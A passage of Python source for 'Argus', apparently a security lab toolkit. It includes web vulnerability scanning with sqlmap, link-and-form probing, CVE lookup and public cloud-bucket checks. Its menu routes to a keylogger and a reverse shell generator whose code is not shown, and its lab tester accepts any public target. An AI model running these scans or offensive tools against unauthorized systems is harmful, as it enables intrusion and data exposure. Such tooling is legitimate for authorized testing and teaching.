    if checks.get("cookies"):
        _check_cookies(response, issues)
    if checks.get("paths"):
        _check_sensitive_paths(url, session, issues)
    if checks.get("robots"):
        _check_robots_txt(url, session, issues)
    if checks.get("dirlist"):
        _check_directory_listing(url, session, issues)
    if checks.get("wellknown"):
        _check_well_known_files(response.url, session, issues)
    if checks.get("redirect"):
        _check_open_redirect(url, session, issues)
    if checks.get("ratelimit"):
        _check_rate_limiting(url, session, response, issues)
    if checks.get("waf"):
        _check_waf_detection(response, issues)
    if checks.get("tech"):
        _check_tech_stack(response.url, response, issues)
    if checks.get("sqlmap"):
        _run_sqlmap_assisted_scan(response.url, issues)
    if checks.get("csrf"):
        _check_csrf(response, session, issues)
    if checks.get("ssrf"):
        _check_ssrf(url, response, session, issues)

    report_text = _render_report(url, issues, response)
    if save_to_db:
        run_id = _save_tool_run("web_scan", url, f"{len(issues)} findings", report_text)
        if run_id:
            print(f"\n  [+] Saved scan to SQLite result #{run_id}.")
    return 0


def _cli_hash(args: Any) -> int:
    algorithm = args.algorithm
    h = hashlib.new(algorithm)
    if args.text is not None:
        h.update(args.text.encode("utf-8"))
        target = "text"
    else:
        with open(args.file, "rb") as f:
            for chunk in iter(lambda: f.read(1024 * 1024), b""):
                h.update(chunk)
        target = args.file
    print(f"{algorithm}({target}) = {h.hexdigest()}")
    return 0


def _cli_password(args: Any) -> int:
    selected = {
        "Uppercase letters": string.ascii_uppercase,
        "Lowercase letters": string.ascii_lowercase,
        "Numbers": string.digits,
        "Symbols": string.punctuation,
    }
    password = generate_password(selected, args.length)
    strength = _estimate_password_strength(password)
    print(password)
    print(f"score={strength['score']}/4 engine={strength['engine']}")
    print(f"offline_fast={strength['offline_fast']}")
    return 0


def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog=os.path.basename(sys.argv[0]),
        description="Argus command-line shortcuts",
    )
    sub = parser.add_subparsers(dest="command", required=True)

    scan = sub.add_parser("scan", help="Run the web vulnerability scanner")
    scan.add_argument("--url", required=True, help="Target URL")
    scan.add_argument("--all", action="store_true", help="Run all standard checks")
    scan.add_argument("--sqlmap", action="store_true", help="Offer sqlmap assisted SQLi scan")
    scan.add_argument("--no-db", action="store_true", help="Do not save the scan to SQLite")

    hash_cmd = sub.add_parser("hash", help="Hash text or a file")
    hash_cmd.add_argument("--algorithm", default="sha256", choices=CLI_HASH_ALGORITHMS)
    source = hash_cmd.add_mutually_exclusive_group(required=True)
    source.add_argument("--text")
    source.add_argument("--file")

    jwt_cmd = sub.add_parser("jwt", help="Inspect a JWT without verifying the signature")
    jwt_cmd.add_argument("token")

    password = sub.add_parser("password", help="Generate a password")
    password.add_argument("--length", type=int, default=20)

    return parser


def _run_cli(argv: list[str]) -> int:
    parser = _build_parser()
    args = parser.parse_args(argv)

    if args.command == "scan":
        checks = set(STANDARD_WEB_CHECKS) if args.all else {
            "http_redirect", "ssl", "headers", "server", "cors",
            "methods", "cookies", "waf", "tech",
        }
        if args.sqlmap:
            checks.add("sqlmap")
        return run_web_scan_once(args.url, checks, save_to_db=not args.no_db)

    if args.command == "hash":
        return _cli_hash(args)

    if args.command == "jwt":
        print(inspect_jwt_token(args.token))
        return 0

    if args.command == "password":
        return _cli_password(args)

    parser.print_help()
    return 2




def _is_private_or_local_target(url: str) -> bool:
    """Return True for localhost, loopback, link-local, or private IP targets."""
    import urllib.parse
    parsed = urllib.parse.urlparse(_normalize_url(url))
    host = (parsed.hostname or "").lower()
    if not host:
        return False
    if host in {"localhost", "localhost.localdomain"} or host.endswith(".localhost"):
        return True
    try:
        ip = ipaddress.ip_address(host)
        return ip.is_loopback or ip.is_private or ip.is_link_local
    except ValueError:
        return False


def _same_host_links(html_text: str, base_url: str) -> list[str]:
    """Extract same-host links, scripts, frames, and stylesheets from HTML."""
    import urllib.parse
    try:
        from bs4 import BeautifulSoup
    except ImportError:
        return []

    soup = BeautifulSoup(html_text, "html.parser")
    parsed = urllib.parse.urlparse(base_url)
    origin = (parsed.scheme, parsed.hostname, parsed.port)
    out = set()
    attr_map = {
        "a": "href",
        "link": "href",
        "script": "src",
        "img": "src",
        "iframe": "src",
        "source": "src",
    }
    for tag in soup.find_all(list(attr_map.keys())):
        raw = tag.get(attr_map.get(tag.name, "href"))
        if not raw:
            continue
        if raw.startswith(("javascript:", "mailto:", "tel:")):
            continue
        abs_url = urllib.parse.urljoin(base_url, raw)
        p = urllib.parse.urlparse(abs_url)
        candidate = (p.scheme, p.hostname, p.port)
        if candidate[:2] == origin[:2]:
            out.add(urllib.parse.urlunparse(p._replace(fragment="")))
    return sorted(out)


def _extract_forms(html_text: str, base_url: str) -> list[dict[str, Any]]:
    """Summarize HTML forms without submitting anything."""
    import urllib.parse
    try:
        from bs4 import BeautifulSoup
    except ImportError:
        return []

    soup = BeautifulSoup(html_text, "html.parser")
    forms = []
    for form in soup.find_all("form"):
        action = urllib.parse.urljoin(base_url, form.get("action", ""))
        method = (form.get("method", "GET") or "GET").upper()
        fields = []
        for field in form.find_all(["input", "textarea", "select"]):
            name = field.get("name") or field.get("id") or ""
            if not name:
                continue
            fields.append({
                "name": name,
                "type": field.get("type", field.name),
                "placeholder": field.get("placeholder", ""),
            })
        forms.append({"action": action, "method": method, "fields": fields})
    return forms


def analyze_target(url: str) -> dict[str, Any]:
    """
    Analyze ANY URL target instead of only private/local hosts.

    Returns metadata about:
      - hostname
      - resolved IPs
      - whether the target is public/private
      - loopback/link-local/etc.
    """

    import urllib.parse
    import socket
    import ipaddress

    parsed = urllib.parse.urlparse(_normalize_url(url))
    host = (parsed.hostname or "").strip().lower()

    if not host:
        return {
            "valid": False,
            "reason": "No hostname found"
        }

    result = {
        "valid": True,
        "host": host,
        "is_ip": False,
        "resolved_ips": [],
        "ip_details": [],
    }

    try:
        # Direct IP target
        ip = ipaddress.ip_address(host)

        result["is_ip"] = True
        result["resolved_ips"].append(str(ip))

        categories = []

        if ip.is_private:
            categories.append("private")

        if ip.is_loopback:
            categories.append("loopback")

        if ip.is_link_local:
            categories.append("link_local")

        if ip.is_reserved:
            categories.append("reserved")

        if ip.is_multicast:
            categories.append("multicast")

        if ip.is_global:
            categories.append("public")

        result["ip_details"].append({
            "ip": str(ip),
            "categories": categories
        })

    except ValueError:

        # Resolve domains
        try:
            infos = socket.getaddrinfo(host, None)

            seen = set()

            for info in infos:
                ip_str = info[4][0]

                if ip_str in seen:
                    continue

                seen.add(ip_str)

                result["resolved_ips"].append(ip_str)

                ip = ipaddress.ip_address(ip_str)

                categories = []

                if ip.is_private:
                    categories.append("private")

                if ip.is_loopback:
                    categories.append("loopback")

                if ip.is_link_local:
                    categories.append("link_local")

                if ip.is_reserved:
                    categories.append("reserved")

                if ip.is_multicast:
                    categories.append("multicast")

                if ip.is_global:
                    categories.append("public")

                result["ip_details"].append({
                    "ip": ip_str,
                    "categories": categories
                })

        except socket.gaierror:
            result["valid"] = False
            result["reason"] = "DNS resolution failed"

    return result


def run_authorized_lab_tester() -> None:
    """
    Authorized Lab Tester -- passive discovery + harmless probes.

    Enter a target URL to:
      - Analyze hostname and resolved IPs (public/private/loopback)
      - Discover same-host links and forms
      - Send harmless ?argus_probe=1 probes to sampled same-host links
      - Optionally save the report to a text file

    Only use against targets you own or are authorized to test.
    Requires: pip install requests beautifulsoup4
    """
    try:
        import requests
        from requests.exceptions import RequestException
    except ImportError:
        print("\n  [!] requests is not installed.  Run:  pip install requests")
        input("\nPress Enter to return...")
        return

    import urllib.parse

    print_rule("Authorized Lab Tester")
    config     = _load_argus_config()
    shodan_key = config.get("shodan_key", "")

    if shodan_key:
        print("  [+] Shodan key loaded — resolved IPs will be enriched.")
    else:
        print("  [i] No Shodan key — using InternetDB for passive IP intelligence (free).")
    print()

    print("  Only use against targets you own or are authorized to test.\n")

    while True:
        target = _normalize_url(input("  Target URL: ").strip())
        if not target:
            print("  [!] URL cannot be empty.")
            continue
        break

    target_info = analyze_target(target)
    if not target_info.get("valid"):
        print(f"  [!] Invalid target: {target_info.get('reason', 'unknown error')}")
        input("\nPress Enter to return...")
        return

    print("\n  Target Analysis")
    print("  " + "-" * 48)
    print(f"  Host        : {target_info['host']}")
    print(f"  Valid       : {target_info['valid']}")

    if target_info.get("resolved_ips"):
        print("     Resolved IPs:")
        for ip in target_info["ip_details"]:
            cats = ", ".join(ip["categories"]) or "unknown"
            print(f"    - {ip['ip']}  [{cats}]")

    print("  " + "-" * 48)

    # ── Passive Shodan / InternetDB enrichment ────────────────────────
    global_ips = [
        ip["ip"] for ip in target_info.get("ip_details", [])
        if "public" in ip.get("categories", [])
    ]
    if global_ips:
        sep = "=" * 56
        print(f"\n  {sep}")
        print("  PASSIVE HOST INTELLIGENCE")
        print(f"  {sep}")
        for ip_str in global_ips[:3]:
            print(f"\n  [{ip_str}]")
            if shodan_key:
                try:
                    sd = _ioc_query_shodan_host(ip_str, shodan_key)
                    if "error" not in sd:
                        ports   = sd.get("ports", [])
                        vulns   = sd.get("vulns") or {}
                        tags    = sd.get("tags") or []
                        org     = sd.get("org", "?")
                        country = sd.get("country_name", "?")
                        banners = sd.get("data") or []
                        last    = (sd.get("last_update") or "")[:10]
                        print(f"  Org         : {org}  ({country})")
                        print(f"  Last seen   : {last}")
                        port_str = ", ".join(str(p) for p in sorted(ports)[:20]) or "none"
                        print(f"  Open ports  : {port_str}")
                        if tags:
                            print(f"  Tags        : {', '.join(tags)}")
                        if banners:
                            print("  Services:")
                            for svc in sorted(banners, key=lambda x: x.get("port", 0))[:8]:
                                prod = (f"{svc.get('product','')} {svc.get('version','')}").strip()
                                ssl_v = ""
                                if svc.get("ssl"):
                                    vers = svc["ssl"].get("versions", [])
                                    ssl_v = f"  [{vers[-1]}]" if vers else ""
                                print(f"    {svc.get('port')}/{svc.get('transport','tcp'):<4} {prod or 'unknown'}{ssl_v}")
                        if vulns:
                            print(f"  CVEs ({len(vulns)}):")
                            for cve_id, cve_data in list(vulns.items())[:5]:
                                cvss = cve_data.get("cvss", "?")
                                summ = (cve_data.get("summary") or "")[:55]
                                print(f"    {cve_id:<20} CVSS {cvss}  {summ}")
                            if len(vulns) > 5:
                                print(f"    ... {len(vulns) - 5} more CVE(s)")
                    elif sd.get("error") == "not_found":
                        print("  No Shodan data for this IP.")
                    else:
                        print(f"  [!] {sd['error']}")
                except Exception as e:
                    print(f"  [!] Shodan error: {_scrub_key(e, shodan_key)}")
            else:
                try:
                    idb = _ioc_query_internetdb(ip_str)
                    if "error" not in idb:
                        idb_ports = idb.get("ports", [])
                        idb_cves  = idb.get("vulns", [])
                        idb_tags  = idb.get("tags", [])
                        idb_cpes  = idb.get("cpes", [])
                        port_str  = ", ".join(str(p) for p in sorted(idb_ports)) or "none"
                        print(f"  Open ports  : {port_str}")
                        if idb_tags:
                            print(f"  Tags        : {', '.join(idb_tags)}")
                        if idb_cpes:
                            print(f"  CPEs        : {', '.join(idb_cpes[:4])}")
                        if idb_cves:
                            print(f"  CVEs ({len(idb_cves)}): {', '.join(idb_cves[:6])}")
                    elif idb.get("error") == "not_found":
                        print("  No InternetDB data for this IP.")
                except Exception as e:
                    print(f"  [!] InternetDB error: {e}")
        print()

    session = requests.Session()
    session.headers.update({"User-Agent": _random_user_agent("LabTester")})

    try:
        base = session.get(target, timeout=10, allow_redirects=True)
    except RequestException as e:
        print(f"  [!] Could not reach target: {e}")
        input("\nPress Enter to return...")
        return

    report = []
    report.append(f"Target         : {target}")
    report.append(f"Final URL      : {base.url}")
    report.append(f"Status         : HTTP {base.status_code}")
    report.append(f"Response bytes : {len(base.content):,}")
    report.append("")

    # Passive discovery
    links = _same_host_links(base.text, base.url)
    forms = _extract_forms(base.text, base.url)
    report.append(f"Same-host links: {len(links)}")
    report.append(f"Forms found    : {len(forms)}")

    if links:
        report.append("")
        report.append("Sample links:")
        for link in links[:20]:
            report.append(f"  - {link}")

    if forms:
        report.append("")
        report.append("Forms:")
        for idx, form in enumerate(forms[:20], 1):
            report.append(f"  {idx}. {form['method']} {form['action']}")
            for field in form["fields"][:10]:
                hint = f" ({field['type']})" if field.get('type') else ""
                report.append(f"       - {field['name']}{hint}")

    # Harmless probe: add a benign query marker to a few same-host URLs
    probe_results = []
    for url in links[:10]:
        try:
            import urllib.parse
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            params["argus_probe"] = ["1"]
            test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(params, doseq=True)))
            r = session.get(test_url, timeout=6, allow_redirects=True)
            probe_results.append((test_url, r.status_code, len(r.content), r.url))
        except Exception:
            continue

    if probe_results:
        report.append("")
        report.append("Harmless probe checks:")
        for url, code, size, final in probe_results:
            report.append(f"  - {code:>3} {size:>8,} bytes  {final}")

    report_text = "\n".join(report)
    print("\n" + report_text)
    run_id = _save_tool_run("lab_tester", target, f"{len(links)} links, {len(forms)} forms", report_text)
    if run_id:
        print(f"\n  [+] Saved lab test to SQLite result #{run_id}.")

    if input("\n  Save report to text file? (y/n): ").strip().lower() == "y":
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        safe = re.sub(r"[^A-Za-z0-9._-]+", "_", urllib.parse.urlparse(base.url).hostname or "lab")
        fname = f"labtest_{safe}_{ts}.txt"
        try:
            with open(fname, "w", encoding="utf-8") as f:
                f.write(report_text + "\n")
            print(f"  [+] Report written to {fname}")
        except OSError as e:
            print(f"  [!] Could not save report: {e}")

    input("\nPress Enter to return to the main menu...")


def _nvd_fetch(params: dict[str, Any]) -> dict[str, Any]:
    """
    Query the NIST NVD CVE API v2.0.  Free, no API key required.
    NVD recommends ≤ 5 requests/30 s without a key.
    Returns the full JSON response dict or {"error": "..."} on failure.
    """
    try:
        import requests
    except ImportError:
        return {"error": "requests not installed"}
    try:
        resp = requests.get(
            "https://services.nvd.nist.gov/rest/json/cves/2.0",
            params=params,
            headers={"User-Agent": f"Argus/{APP_VERSION}"},
            timeout=20,
        )
        if resp.status_code == 403:
            return {"error": "NVD rate-limited — wait 30 s and try again (5 req/30 s without API key)"}
        if resp.status_code == 404:
            return {"error": "not_found"}
        resp.raise_for_status()
        return resp.json()
    except Exception as e:
        return {"error": str(e)}


def _epss_fetch(cve_id: str) -> tuple[float | None, float | None]:
    """
    Query the EPSS API (first.org) for exploit prediction score.
    Free, no API key required.
    Returns (score_float, percentile_float) or (None, None) on failure.
    """
    try:
        import requests
        resp = requests.get(
            "https://api.first.org/data/v1/epss",
            params={"cve": cve_id},
            timeout=10,
        )
        resp.raise_for_status()
        data = resp.json().get("data", [])
        if data:
            return float(data[0]["epss"]), float(data[0]["percentile"])
    except Exception:
        pass
    return None, None


def _display_cve(cve_obj: dict[str, Any]) -> None:
    """
    Print a formatted CVE entry from an NVD response object.
    Returns a list of plain-text lines suitable for saving to the database.
    """
    import textwrap

    cve    = cve_obj.get("cve", {})
    cve_id = cve.get("id", "?")

    # English description
    desc = "No description available."
    for d in cve.get("descriptions", []):
        if d.get("lang") == "en":
            desc = d.get("value", desc)
            break

    # CVSS — prefer v3.1, fall back to v3.0 then v2
    cvss_score = None
    cvss_sev   = "?"
    cvss_vec   = "?"
    for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV40"):
        metrics = cve.get("metrics", {}).get(key, [])
        if metrics:
            d          = metrics[0].get("cvssData", {})
            cvss_score = d.get("baseScore")
            cvss_sev   = d.get("baseSeverity", "?")
            cvss_vec   = d.get("vectorString",  "?")
            break
    if cvss_score is None:
        m2 = cve.get("metrics", {}).get("cvssMetricV2", [])
        if m2:
            d          = m2[0].get("cvssData", {})
            cvss_score = d.get("baseScore")
            cvss_sev   = m2[0].get("baseSeverity", "CVSSv2")
            cvss_vec   = d.get("vectorString", "?")

    # CWE
    cwes = []
    for w in cve.get("weaknesses", []):
        for wd in w.get("description", []):
            if wd.get("lang") == "en" and wd.get("value", "").startswith("CWE-"):
                cwes.append(wd["value"])

    published = (cve.get("published")    or "?")[:10]
    modified  = (cve.get("lastModified") or "?")[:10]

    if cvss_score is None:
        score_str = "N/A"
    elif cvss_score >= 9.0:
        score_str = f"{cvss_score}  [CRITICAL]"
    elif cvss_score >= 7.0:
        score_str = f"{cvss_score}  [HIGH]"
    elif cvss_score >= 4.0:
        score_str = f"{cvss_score}  [MEDIUM]"
    else:
        score_str = f"{cvss_score}  [LOW]"

    print(f"\n  {'─'*62}")
    print(f"  {cve_id}")
    print(f"  {'─'*62}")
    print(f"  CVSS Score     : {score_str}")
    print(f"  CVSS Vector    : {cvss_vec}")
    print(f"  CWE            : {', '.join(cwes) if cwes else 'none listed'}")
    print(f"  Published      : {published}    Last modified: {modified}")
    print(f"\n  Description:")
    for part in textwrap.wrap(desc, width=70):
        print(f"    {part}")

    # EPSS
    epss, epss_pct = _epss_fetch(cve_id)
    if epss is not None:
        prob = f"{epss * 100:.2f}%"
        pct_str = f"  ({epss_pct * 100:.1f}th percentile)" if epss_pct else ""
        print(f"\n  EPSS Score     : {epss:.4f}  →  {prob} exploitation probability in next 30 days{pct_str}")
        if epss >= 0.5:
            print("  [  !!  ] HIGH exploitation probability — prioritise patching immediately")
        elif epss >= 0.1:
            print("  [   !  ] Moderate exploitation probability — schedule patching soon")
        else:
            print("  [   i  ] Low exploitation probability (still assess based on CVSS)")
    else:
        print("\n  EPSS Score     : unavailable")

    lines = [
        cve_id,
        f"  CVSS        : {score_str}",
        f"  Vector      : {cvss_vec}",
        f"  CWE         : {', '.join(cwes) if cwes else 'none'}",
        f"  Published   : {published}",
        f"  EPSS        : {f'{epss:.4f}' if epss is not None else 'unavailable'}",
        f"  Description : {desc[:300]}",
    ]
    return lines


def run_cve_lookup() -> None:
    """
    Tool 19: CVE / NVD Lookup with EPSS exploitation probability scoring.
    Queries NIST NVD (cves/2.0) and first.org EPSS — both free, no API key needed.
    Supports lookup by exact CVE-ID or keyword search.
    """
    print_rule("CVE / NVD Lookup")
    print("  Search NIST NVD for vulnerability details + EPSS exploitation score.")
    print("  No API key required.  NVD rate limit: 5 requests / 30 seconds.\n")
    print("  1. Search by CVE-ID   (e.g. CVE-2024-12345)")
    print("  2. Search by keyword  (e.g. apache, log4j, openssl)")

    mode = input("\n  Choice [1]: ").strip() or "1"
    if mode not in ("1", "2"):
        print("  [!] Invalid choice.")
        input("\nPress Enter to return...")
        return

    all_lines = []

    if mode == "1":
        raw = input("  CVE-ID: ").strip().upper()
        if not raw:
            print("  [!] CVE-ID cannot be empty.")
            input("\nPress Enter to return...")
            return
        cve_id = raw if raw.startswith("CVE-") else f"CVE-{raw}"
        print(f"\n  [*] Querying NIST NVD for {cve_id} ...")
        result = _nvd_fetch({"cveId": cve_id})
        if "error" in result:
            print(f"  [!] {result['error']}")
            input("\nPress Enter to return...")
            return
        vulns = result.get("vulnerabilities", [])
        if not vulns:
            print(f"  [i] {cve_id} was not found in the NIST NVD database.")
            input("\nPress Enter to return...")
            return
        for v in vulns:
            all_lines += _display_cve(v)
        _save_tool_run("cve_lookup", cve_id,
                       f"CVE lookup: {cve_id}",
                       "\n".join(all_lines))

    else:  # keyword
        keyword = input("  Keyword: ").strip()
        if not keyword:
            print("  [!] Keyword cannot be empty.")
            input("\nPress Enter to return...")
            return
        raw_limit = input("  Max results [10]: ").strip() or "10"
        limit = min(int(raw_limit) if raw_limit.isdigit() else 10, 20)
        print(f"\n  [*] Searching NIST NVD for '{keyword}' (max {limit}) ...")
        result = _nvd_fetch({"keywordSearch": keyword, "resultsPerPage": limit})
        if "error" in result:
            print(f"  [!] {result['error']}")
            input("\nPress Enter to return...")
            return
        total = result.get("totalResults", 0)
        vulns = result.get("vulnerabilities", [])
        if not vulns:
            print(f"  [i] No CVEs found matching '{keyword}'.")
            input("\nPress Enter to return...")
            return
        print(f"  [+] {total:,} total NVD result(s) — showing first {len(vulns)}")
        for v in vulns:
            all_lines += _display_cve(v)
        _save_tool_run("cve_lookup", keyword,
                       f"CVE keyword search: '{keyword}' ({len(vulns)} of {total} shown)",
                       "\n".join(all_lines))

    input("\nPress Enter to return...")


def run_cloud_security_checker() -> None:
    """
    Tool 20: Cloud Storage Security Checker.
    Probes AWS S3, Azure Blob Storage, and GCP Cloud Storage for
    publicly accessible buckets via HTTP — no API keys required.
    Only test buckets you own or are authorised to test.
    """
    print_rule("Cloud Security Checker")
    print("  Probe cloud storage for public access misconfiguration.")
    print("  Only test buckets/containers you own or are authorised to test.\n")

    name = input("  Bucket / storage name: ").strip().lower()
    if not name:
        print("  [!] Name cannot be empty.")
        input("\nPress Enter to return...")
        return

    try:
        import requests
    except ImportError:
        print("  [!] requests library not installed.")
        input("\nPress Enter to return...")
        return

    headers = {"User-Agent": f"Argus/{APP_VERSION}"}
    lines   = [f"Cloud Security Check: {name}", ""]
    hits    = []

    TARGETS = [
        # (provider, label, url, check_for_xml_listing)
        ("AWS S3",  "Virtual-hosted bucket",    f"https://{name}.s3.amazonaws.com/",                                              True),
        ("AWS S3",  "Path-style bucket",         f"https://s3.amazonaws.com/{name}/",                                             True),
        ("Azure",   "Blob container",            f"https://{name}.blob.core.windows.net/{name}?restype=container&comp=list",       False),
        ("Azure",   "Static website ($web)",     f"https://{name}.blob.core.windows.net/$web/",                                    False),
        ("GCP",     "XML API",                   f"https://storage.googleapis.com/{name}/",                                        True),
        ("GCP",     "JSON API",                  f"https://storage.googleapis.com/storage/v1/b/{name}/o",                          True),
    ]

    print(f"  [*] Probing {len(TARGETS)} endpoints for '{name}'...\n")

    for provider, label, url, check_listing in TARGETS:
        try:
            resp    = requests.get(url, headers=headers, timeout=8, allow_redirects=True)
            status  = resp.status_code
            body    = resp.text[:40_000].lower() if len(resp.content) < 40_000 else ""

            is_listing = check_listing and any(
                kw in body for kw in (
                    "<listbucketresult", "<listallmybucketsresult",
                    "<enumerationresults", '"kind": "storage#objects"',
                )
            )

            if is_listing:
                verdict = "CRITICAL — PUBLIC LISTING: bucket contents visible to anyone"
                hits.append((provider, label, url, "CRITICAL: public listing"))
            elif status == 200:
                verdict = "HIGH     — HTTP 200: resource accessible (possible public access)"
                hits.append((provider, label, url, f"HIGH: HTTP 200 ({len(resp.content):,} bytes)"))
            elif status in (401, 403):
                verdict = f"INFO     — HTTP {status}: bucket exists but access is restricted"
                hits.append((provider, label, url, f"INFO: HTTP {status} (exists, restricted)"))
            elif status == 400:
                verdict = f"OK       — HTTP 400: invalid request / name not valid for this provider"
            elif status == 404:
                verdict = f"OK       — HTTP 404: not found"
            else:
                verdict = f"UNKNOWN  — HTTP {status}"

            print(f"  {provider:<8} {label:<30}")
            print(f"  [{verdict}]")
            print(f"  URL: {url[:80]}")
            print()
            lines += [f"{provider} — {label}", f"  URL    : {url}", f"  Result : {verdict}", ""]

        except requests.exceptions.ConnectionError:
            print(f"  {provider:<8} {label:<30}")
            print("  [OK     — Connection refused / hostname unresolvable (bucket likely absent)]")
            print(f"  URL: {url[:80]}\n")
        except Exception as e:
            print(f"  {provider:<8} {label:<30}")
            print(f"  [ERROR  — {e}]\n")

    # Summary
    print("  " + "─" * 62)
    if hits:
        print(f"  [!] {len(hits)} potential issue(s) found:\n")
        for provider, label, url, sev in hits:
            print(f"    [{provider}] {label}: {sev}")
    else:
        print("  [+] No publicly accessible storage found for this name.")

    lines += ["", "SUMMARY", f"  Issues: {len(hits)}"]
    for provider, label, url, sev in hits:
        lines.append(f"  [{provider}] {label}: {sev}")

    _save_tool_run(
        "cloud_check", name,
        f"Cloud security check: '{name}' — {len(hits)} issue(s)",
        "\n".join(lines),
    )
    input("\nPress Enter to return...")


def run_config_wizard() -> None:
    """
    Interactive wizard to add or update API keys in argus_config.json.
    Accessible from the main menu (option c) or called on first run.
    """
    print_rule("API Key Configuration")

    config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "argus_config.json")
    config      = _load_argus_config()

    # Registry of all known keys with descriptions and registration URLs
    KEY_REGISTRY = [
        {
            "key":  "abuseipdb_key",
            "name": "AbuseIPDB",
            "url":  "https://www.abuseipdb.com/api",
            "desc": "IP reputation — used by IOC Assistant, IP Intelligence",
        },
        {
            "key":  "virustotal_key",
            "name": "VirusTotal",
            "url":  "https://www.virustotal.com/gui/my-apikey",
            "desc": "Multi-engine file/URL/IP/domain analysis — used by IOC Assistant",
        },
        {
            "key":  "shodan_key",
            "name": "Shodan",
            "url":  "https://account.shodan.io",
            "desc": "Internet-wide host intelligence — used by IOC Assistant, Port Scanner, IP Intel, Domain Lookup",
        },
        {
            "key":  "urlhaus_key",
            "name": "URLhaus",
            "url":  "https://urlhaus.abuse.ch/api/",
            "desc": "Malicious URL/domain database — used by IOC Assistant",
        },
        {
            "key":  "censys_pat",
            "name": "Censys",
            "url":  "https://accounts.censys.io/settings/personal-access-tokens",
            "desc": "Internet-wide host scan data — used by IOC Assistant (IP lookups)",
        },
    ]

    def _masked(val: str) -> str:
        return f"{val[:4]}...{val[-4:]}" if len(val) >= 8 else "****"

    print(f"  Config file: {config_path}\n")
    print("  Current status:")
    for idx, item in enumerate(KEY_REGISTRY, 1):
        val    = config.get(item["key"], "")
        status = f"[+] SET  ({_masked(val)})" if val else "[ ] not set"
        print(f"    {idx}.  {status:<22}  {item['name']}")

    print()
    print("  Options:")
    print("    a  Walk through all keys")
    for idx, item in enumerate(KEY_REGISTRY, 1):
        print(f"    {idx}  Set {item['name']} key")
    print("    v  Validate VirusTotal key with a live test query")
    print("    q  Return to menu (no changes)")
    print()

    choice = input("  Choice: ").strip().lower()

    if choice == "q":
        return

    if choice == "v":
        vt_key = config.get("virustotal_key", "")
        if not vt_key:
            print("\n  [!] No VirusTotal key in config — add one first (option 2).")
        else:
            print(f"\n  [*] Testing VirusTotal key ({_masked(vt_key)}) against 8.8.8.8 ...")
            result = _ioc_query_virustotal("8.8.8.8", "ip", vt_key)
            if "error" in result:
                print(f"  [!] Validation FAILED: {_scrub_key(result['error'], vt_key)}")
            else:
                attrs = result.get("attributes", {})
                country = attrs.get("country", "?")
                print(f"  [+] VirusTotal key is VALID — API returned country '{country}' for 8.8.8.8.")
        input("\nPress Enter to return...")
        return

    keys_to_set = []
    if choice == "a":
        keys_to_set = KEY_REGISTRY
    else:
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(KEY_REGISTRY):
                keys_to_set = [KEY_REGISTRY[idx]]
            else:
                print("  [!] Invalid choice.")
                input("\nPress Enter to return...")
                return
        except ValueError:
            print("  [!] Invalid choice.")
            input("\nPress Enter to return...")
            return

    changed = False
    for item in keys_to_set:
        current = config.get(item["key"], "")
        print(f"\n  ── {item['name']} ──────────────────────────────────────")
        print(f"  {item['desc']}")
        print(f"  Register at : {item['url']}")
        if current:
            print(f"  Current key : {_masked(current)}  (press Enter to keep)")
        new_val = input("  API key     : ").strip()
        if new_val:
            config[item["key"]] = new_val
            print(f"  [+] {item['name']} key saved.")
            changed = True
        elif current:
            print(f"  [i] Keeping existing {item['name']} key.")
        else:
            print(f"  [i] Skipped — no key entered.")

    if changed:
        try:
            with open(config_path, "w", encoding="utf-8") as f:
                json.dump(config, f, indent=4)
            print(f"\n  [+] argus_config.json updated at: {config_path}")
        except Exception as e:
            print(f"\n  [!] Failed to save config: {e}")
    else:
        print("\n  [i] No changes made.")

    input("\nPress Enter to return...")


def display_main_menu() -> None:
    print()
    for line in ARGUS_BANNER.splitlines():
        ui_print(line, "logo")

    ui_print("Authorized cyber lab utilities for learning, defense, and CTF work.", "danger")
    print()
    ui_segments([("[+] ", "ok"), ("Version", "warn"), ("     : ", "muted"), (APP_VERSION, "text")])
    ui_segments([("[+] ", "ok"), ("Created By", "warn"), ("  : ", "muted"), ("Derian Farley", "text")])
    ui_segments([(" |-> ", "ok"), ("Database", "warn"), ("    : ", "muted"), (DB_FILE, "text")])
    ui_segments([(" |-> ", "ok"), ("Notice", "warn"), ("      : ", "muted"), ("Use only on systems you own or are authorized to test.", "text")])
    print()

    for section, rows in MENU_SECTIONS:
        ui_segments([("[+] ", "ok"), (section, "warn")])
        for key, name, detail in rows:
            ui_segments([
                ("    |-> ", "ok"),
                (f"{key:>2}", "danger"),
                ("  ", "muted"),
                (f"{name:<28}", "info"),
                (detail, "text"),
            ])
        print()

    ui_segments([("[+] ", "ok"), ("0", "danger"), ("  Exit", "info")])
    ui_print("-" * 66, "muted")


def main(argv: list[str] | None = None) -> int:
    argv = sys.argv[1:] if argv is None else argv
    if argv:
        return _run_cli(argv)

    print("\n  Welcome to Argus!")

    ROUTES = {
        "1": run_cipher,
        "2": run_password_generator,
        "3": run_encoder_decoder,
        "4": run_packet_sniffer,
        "5": run_web_scanner,
        "6": run_http_repeater,
        "7": run_spider,
        "8": run_keylogger,
        "9": run_results_database,
        "10": run_recon_tools,
        "11": run_password_hash_tools,
        "12": run_file_forensics_tools,
        "13": run_authorized_lab_tester,
        "14": run_osint_tools,
        "15": run_ssl_inspector,
        "16": run_reverse_shell_generator,
        "17": run_dir_brute_forcer,
        "18": run_subdomain_enumerator,
        "19": run_cve_lookup,
        "20": run_cloud_security_checker,
        "c":  run_config_wizard,
    }

    while True:
        display_main_menu()
        choice = input("  Choice: ").strip()

        if choice == "0":
            print("\n  Thank you for using Argus. Goodbye!\n")
            return 0
        elif choice in ROUTES:
            ROUTES[choice]()
        else:
            print("\n  [!] Invalid choice — enter a number from the menu.")


if __name__ == "__main__":
    sys.exit(main())
